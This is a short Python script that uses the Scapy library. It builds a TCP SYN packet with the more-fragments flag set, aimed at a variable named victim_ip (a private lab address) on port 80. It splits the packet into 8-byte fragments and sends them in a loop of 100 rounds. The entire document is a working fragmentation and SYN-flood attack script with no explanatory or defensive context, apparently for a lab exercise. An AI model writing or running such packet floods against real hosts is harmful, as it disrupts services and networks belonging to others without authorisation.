
from scapy.all import IP, TCP, fragment, send        # Import required functions



victim_ip = "192.168.56.102"  
victim_port = 80              

syn_packet = IP(dst=victim_ip, flags="MF")/TCP(dport=victim_port, flags="S")

for i in range(100):  
    fragments = fragment(syn_packet, fragsize=8)  # Set fragment size to 8 bytes
    for fragment_packet in fragments:
        send(fragment_packet)
